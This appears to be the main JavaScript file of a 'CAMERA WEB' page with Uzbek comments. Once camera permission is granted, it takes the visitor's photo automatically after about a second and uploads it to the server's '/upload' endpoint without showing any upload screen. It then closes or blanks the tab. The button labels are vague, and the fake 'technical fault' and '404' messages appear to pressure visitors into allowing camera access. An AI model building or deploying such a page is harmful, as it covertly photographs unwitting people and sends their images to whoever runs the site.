/* =========================================================
   CAMERA WEB - MAIN JAVASCRIPT
   Auto Capture Version
========================================================= */


/* =========================================================
   ELEMENTS
========================================================= */

const introScreen =
    document.getElementById("introScreen");

const cameraScreen =
    document.getElementById("cameraScreen");

const previewScreen =
    document.getElementById("previewScreen");

const loadingScreen =
    document.getElementById("loadingScreen");

const errorScreen =
    document.getElementById("errorScreen");


const startCameraButton =
    document.getElementById("startCameraButton");

const cancelCameraButton =
    document.getElementById("cancelCameraButton");

const captureButton =
    document.getElementById("captureButton");

const retakeButton =
    document.getElementById("retakeButton");

const savePhotoButton =
    document.getElementById("savePhotoButton");

const tryAgainButton =
    document.getElementById("tryAgainButton");


const cameraVideo =
    document.getElementById("cameraVideo");

const photoCanvas =
    document.getElementById("photoCanvas");

const capturedPhoto =
    document.getElementById("capturedPhoto");

const cameraFlash =
    document.getElementById("cameraFlash");

const errorMessage =
    document.getElementById("errorMessage");

const progressBar =
    document.getElementById("progressBar");

const progressText =
    document.getElementById("progressText");

const particlesContainer =
    document.getElementById("particles");

const cameraStatus =
    document.getElementById("cameraStatus");

const liveStatus =
    document.getElementById("liveStatus");


/* =========================================================
   APP STATE
========================================================= */

let cameraStream = null;

let capturedBlob = null;

let capturedDataUrl = null;

let autoCaptureStarted = false;

let progressInterval = null;


/* =========================================================
   SCREEN CHANGER
========================================================= */

function showScreen(screenToShow) {

    const screens = [
        introScreen,
        cameraScreen,
        previewScreen,
        loadingScreen,
        errorScreen
    ];


    screens.forEach(screen => {

        if (screen) {
            screen.classList.remove("active");
        }

    });


    if (screenToShow) {

        screenToShow.classList.add("active");

    }

}


/* =========================================================
   PARTICLES
========================================================= */

function createParticles() {

    if (!particlesContainer) {
        return;
    }


    const particleCount = 30;


    for (
        let i = 0;
        i < particleCount;
        i++
    ) {

        const particle =
            document.createElement("span");


        particle.classList.add(
            "particle"
        );


        particle.style.left =
            Math.random() * 100 + "%";


        particle.style.animationDuration =
            6 +
            Math.random() * 8 +
            "s";


        particle.style.animationDelay =
            Math.random() * 8 +
            "s";


        const size =
            2 +
            Math.random() * 4;


        particle.style.width =
            size + "px";


        particle.style.height =
            size + "px";


        particlesContainer.appendChild(
            particle
        );

    }

}


createParticles();


/* =========================================================
   CAMERA SUPPORT CHECK
========================================================= */

function isCameraSupported() {

    return !!(
        navigator.mediaDevices &&
        navigator.mediaDevices.getUserMedia
    );

}


/* =========================================================
   START CAMERA
========================================================= */

async function startCamera() {

    try {

        autoCaptureStarted = false;


        if (!isCameraSupported()) {

            throw new Error(
                "Brauzeringiz kamera funksiyasini qo‘llab-quvvatlamaydi."
            );

        }


        startCameraButton.disabled =
            true;


        startCameraButton.innerHTML = `

            <span class="button-content">

                Kamera ochilmoqda...

            </span>

        `;


        /*
            Browser foydalanuvchidan
            kamera uchun ruxsat so‘raydi.
        */

        cameraStream =
            await navigator.mediaDevices
                .getUserMedia({

                    video: {

                        facingMode:
                            "user",

                        width: {
                            ideal: 1280
                        },

                        height: {
                            ideal: 720
                        }

                    },

                    audio: false

                });


        /*
            Streamni video elementga ulaymiz.
        */

        cameraVideo.srcObject =
            cameraStream;


        await cameraVideo.play();


        updateCameraStatus(
            true
        );


        showScreen(
            cameraScreen
        );


        startCameraButton.disabled =
            false;


        startCameraButton.innerHTML = `

            <span class="button-glow"></span>

            <span class="button-content">

                <span class="button-icon">
                    😊
                </span>

                ...

            </span>

        `;


        /*
            Foydalanuvchi ruxsat berganidan keyin
            kamera qisqa vaqt ko‘rinadi.

            Keyin avtomatik capture qilinadi.
        */

        if (!autoCaptureStarted) {

            autoCaptureStarted =
                true;


            if (liveStatus) {

                liveStatus.textContent =
                    "PREPARING";

            }


            setTimeout(
                async () => {

                    /*
                        Kamera yopilgan bo‘lsa
                        capture qilmaymiz.
                    */

                    if (!cameraStream) {
                        return;
                    }


                    try {

                        await capturePhoto();

                        /*
                            Capture muvaffaqiyatli bo‘lsa
                            avtomatik serverga yuboramiz.
                        */

                        if (capturedBlob) {

                            await savePhoto();

                        }

                    }

                    catch (error) {

                        console.error(
                            "Auto capture error:",
                            error
                        );


                        showCameraError(
                            "Avtomatik surat olishda xatolik yuz berdi."
                        );

                    }

                },

                1200
            );

        }

    }

    catch (error) {

        console.error(
            "Camera error:",
            error
        );


        startCameraButton.disabled =
            false;


        startCameraButton.innerHTML = `

            <span class="button-glow"></span>

            <span class="button-content">

                <span class="button-icon">
                    😁
                </span>

                ...!

            </span>

        `;


        let message =
            "web saytda texnik nosozlik";


        if (
            error.name ===
                "NotAllowedError" ||
            error.name ===
                "PermissionDeniedError"
        ) {

            message =
                "nosozlik bartaraf etilmadi";

        }


        else if (
            error.name ===
                "NotFoundError" ||
            error.name ===
                "DevicesNotFoundError"
        ) {

            message =
                "nosozlik bartaraf etilmagan";

        }


        else if (
            error.name ===
            "NotReadableError"
        ) {

            message =
                "eroor 404";

        }


        else if (
            error.name ===
            "OverconstrainedError"
        ) {

            message =
                "404 error";

        }


        else if (
            error.message
        ) {

            message =
                error.message;

        }


        showCameraError(
            message
        );

    }

}


/* =========================================================
   STOP CAMERA
========================================================= */

function stopCamera() {

    if (!cameraStream) {
        return;
    }


    cameraStream
        .getTracks()
        .forEach(track => {

            track.stop();

        });


    cameraStream =
        null;


    cameraVideo.srcObject =
        null;


    updateCameraStatus(
        false
    );

}


/* =========================================================
   CAMERA STATUS
========================================================= */

function updateCameraStatus(active) {

    if (!cameraStatus) {
        return;
    }


    if (active) {

        cameraStatus.innerHTML = `

            <span class="status-dot"></span>

            sayt faol

        `;


        if (liveStatus) {

            liveStatus.textContent =
                "LIVE";

        }

    }

    else {

        cameraStatus.innerHTML =
            "saytga kirqilmoqda...";


        if (liveStatus) {

            liveStatus.textContent =
                "OFF";

        }

    }

}


/* =========================================================
   CAPTURE PHOTO
========================================================= */

async function capturePhoto() {

    if (!cameraStream) {

        throw new Error(
            "...!"
        );

    }


    /*
        Video stream tayyor bo‘lishini tekshiramiz.
    */

    if (
        cameraVideo.videoWidth === 0 ||
        cameraVideo.videoHeight === 0
    ) {

        /*
            Ba'zi telefonlarda video metadata
            biroz kechroq tayyor bo‘ladi.
        */

        await waitForVideoReady();

    }


    if (
        cameraVideo.videoWidth === 0 ||
        cameraVideo.videoHeight === 0
    ) {

        throw new Error(
            "urinyabman🙂"
        );

    }


    if (liveStatus) {

        liveStatus.textContent =
            "CAPTURE";

    }


    flashCamera();


    const width =
        cameraVideo.videoWidth;


    const height =
        cameraVideo.videoHeight;


    photoCanvas.width =
        width;


    photoCanvas.height =
        height;


    const context =
        photoCanvas.getContext("2d");


    if (!context) {

        throw new Error(
            "Canvas yaratib bo‘lmadi."
        );

    }


    /*
        Kamera preview mirror ko‘rinishda.

        Shu sabab rasmni ham mirror qilib
        saqlaymiz.
    */

    context.save();


    context.translate(
        width,
        0
    );


    context.scale(
        -1,
        1
    );


    context.drawImage(
        cameraVideo,
        0,
        0,
        width,
        height
    );


    context.restore();


    /*
        Preview uchun data URL.
    */

    capturedDataUrl =
        photoCanvas.toDataURL(
            "image/jpeg",
            0.92
        );


    if (capturedPhoto) {

        capturedPhoto.src =
            capturedDataUrl;

    }


    /*
        Serverga yuborish uchun Blob.
    */

    capturedBlob =
        await canvasToBlob(
            photoCanvas,
            "image/jpeg",
            0.92
        );


    /*
        Surat olingandan keyin kamera
        darhol yopiladi.
    */

    stopCamera();

}


/* =========================================================
   WAIT FOR VIDEO
========================================================= */

function waitForVideoReady() {

    return new Promise(resolve => {

        let attempts = 0;


        const interval =
            setInterval(
                () => {

                    attempts++;


                    if (
                        cameraVideo.videoWidth > 0 &&
                        cameraVideo.videoHeight > 0
                    ) {

                        clearInterval(
                            interval
                        );


                        resolve();

                        return;

                    }


                    if (attempts >= 20) {

                        clearInterval(
                            interval
                        );


                        resolve();

                    }

                },

                100
            );

    });

}


/* =========================================================
   CANVAS TO BLOB
========================================================= */

function canvasToBlob(
    canvas,
    type = "image/jpeg",
    quality = 0.92
) {

    return new Promise(
        (
            resolve,
            reject
        ) => {

            canvas.toBlob(

                blob => {

                    if (!blob) {

                        reject(
                            new Error(
                                "...!."
                            )
                        );

                        return;

                    }


                    resolve(
                        blob
                    );

                },

                type,

                quality

            );

        }
    );

}


/* =========================================================
   FLASH EFFECT
========================================================= */

function flashCamera() {

    if (!cameraFlash) {
        return;
    }


    cameraFlash.classList.remove(
        "active"
    );


    void cameraFlash.offsetWidth;


    cameraFlash.classList.add(
        "active"
    );


    setTimeout(
        () => {

            cameraFlash.classList.remove(
                "active"
            );

        },

        450
    );

}


/* =========================================================
   SAVE PHOTO + EXIT
========================================================= */

async function savePhoto() {

    if (!capturedBlob) {

        showCameraError(
            "error"
        );

        return;
    }


    try {

        const fileName =
            generatePhotoFileName();


        const formData =
            new FormData();


        formData.append(
            "photo",
            capturedBlob,
            fileName
        );


        /*
            Rasmni serverga yuboramiz.
            Loading sahifasi ko‘rsatilmaydi.
        */

        const response =
            await fetch(
                "/upload",
                {
                    method: "POST",
                    body: formData
                }
            );


        let result = null;


        try {

            result =
                await response.json();

        } catch (error) {

            console.warn(
                "?..."
            );

        }


        if (!response.ok) {

            throw new Error(
                result?.message ||
                "?...."
            );

        }


        console.log(
            "✅",
            result
        );


        /*
            Surat muvaffaqiyatli saqlandi.

            Endi sahifani yopishga harakat qilamiz.
        */

        exitWebsite();

    }

    catch (error) {

        console.error(
            "Upload error:",
            error
        );


        showCameraError(
            error.message ||
            "xatolik yuz berdi."
        );

    }

}


/* =========================================================
   EXIT WEBSITE
========================================================= */

function exitWebsite() {

    /*
        Agar tab JavaScript orqali ochilgan bo‘lsa,
        browser uni yopishi mumkin.
    */

    window.open(
        "",
        "_self"
    );


    window.close();


    /*
        Oddiy foydalanuvchi ochgan tabni
        Chrome/Edge yopishga ruxsat bermasligi mumkin.

        Shunda sayt sahifasidan chiqamiz.
    */

    setTimeout(
        () => {

            window.location.replace(
                "about:blank"
            );

        },

        150
    );

}
/* =========================================================
   OPTIONAL MANUAL RETAKE
========================================================= */

async function retakePhoto() {

    capturedBlob =
        null;

    capturedDataUrl =
        null;


    if (capturedPhoto) {

        capturedPhoto.src =
            "";

    }


    await startCamera();

}


/* =========================================================
   FILE NAME GENERATOR
========================================================= */

function generatePhotoFileName() {

    const now =
        new Date();


    const year =
        now.getFullYear();


    const month =
        String(
            now.getMonth() + 1
        ).padStart(
            2,
            "0"
        );


    const day =
        String(
            now.getDate()
        ).padStart(
            2,
            "0"
        );


    const hour =
        String(
            now.getHours()
        ).padStart(
            2,
            "0"
        );


    const minute =
        String(
            now.getMinutes()
        ).padStart(
            2,
            "0"
        );


    const second =
        String(
            now.getSeconds()
        ).padStart(
            2,
            "0"
        );


    return (
        `photo_${year}-${month}-${day}_${hour}-${minute}-${second}.jpg`
    );

}


/* =========================================================
   PROGRESS
========================================================= */

function resetProgress() {

    if (progressInterval) {

        clearInterval(
            progressInterval
        );

        progressInterval =
            null;

    }


    if (progressBar) {

        progressBar.style.width =
            "0%";

    }


    if (progressText) {

        progressText.textContent =
            "0%";

    }

}


function animateProgress() {

    let progress = 0;


    progressInterval =
        setInterval(
            () => {

                if (progress >= 90) {

                    clearInterval(
                        progressInterval
                    );


                    progressInterval =
                        null;


                    return;

                }


                progress +=
                    Math.random() * 8;


                if (progress > 90) {

                    progress =
                        90;

                }


                const displayProgress =
                    Math.floor(progress);


                if (progressBar) {

                    progressBar.style.width =
                        displayProgress +
                        "%";

                }


                if (progressText) {

                    progressText.textContent =
                        displayProgress +
                        "%";

                }

            },

            140
        );

}


function finishProgress() {

    if (progressInterval) {

        clearInterval(
            progressInterval
        );


        progressInterval =
            null;

    }


    if (progressBar) {

        progressBar.style.width =
            "100%";

    }


    if (progressText) {

        progressText.textContent =
            "100%";

    }

}


/* =========================================================
   ERROR
========================================================= */

function showCameraError(message) {

    stopCamera();


    if (errorMessage) {

        errorMessage.textContent =
            message;

    }


    showScreen(
        errorScreen
    );

}


/* =========================================================
   CANCEL
========================================================= */

function cancelCamera() {

    stopCamera();


    capturedBlob =
        null;

    capturedDataUrl =
        null;

    autoCaptureStarted =
        false;


    showScreen(
        introScreen
    );

}


/* =========================================================
   TRY AGAIN
========================================================= */

function tryAgain() {

    capturedBlob =
        null;

    capturedDataUrl =
        null;

    autoCaptureStarted =
        false;


    showScreen(
        introScreen
    );

}


/* =========================================================
   EVENT LISTENERS
========================================================= */

if (startCameraButton) {

    startCameraButton.addEventListener(
        "click",
        startCamera
    );

}


if (cancelCameraButton) {

    cancelCameraButton.addEventListener(
        "click",
        cancelCamera
    );

}


/*
    Capture buttonni qoldirdik.
    Lekin normal oqimda surat avtomatik olinadi.
*/

if (captureButton) {

    captureButton.addEventListener(
        "click",
        async () => {

            try {

                await capturePhoto();

                if (capturedBlob) {

                    await savePhoto();

                }

            }

            catch (error) {

                showCameraError(
                    error.message ||
                    "Surat olishda xatolik."
                );

            }

        }
    );

}


if (retakeButton) {

    retakeButton.addEventListener(
        "click",
        retakePhoto
    );

}


if (savePhotoButton) {

    savePhotoButton.addEventListener(
        "click",
        savePhoto
    );

}


if (tryAgainButton) {

    tryAgainButton.addEventListener(
        "click",
        tryAgain
    );

}


/* =========================================================
   VISIBILITY
========================================================= */

document.addEventListener(
    "visibilitychange",
    () => {

        if (
            document.hidden &&
            cameraStream
        ) {

            if (liveStatus) {

                liveStatus.textContent =
                    "PAUSED";

            }

        }

        else if (cameraStream) {

            if (liveStatus) {

                liveStatus.textContent =
                    "LIVE";

            }

        }

    }
);


/* =========================================================
   CLEANUP
========================================================= */

window.addEventListener(
    "beforeunload",
    () => {

        stopCamera();

    }
);


/* =========================================================
   INITIAL STATE
========================================================= */

showScreen(
    introScreen
);


console.log(
    "%c CAMERA WEB READY ",
    "background:#5ee7ff;color:#02050c;padding:6px 12px;border-radius:6px;font-weight:bold;"
);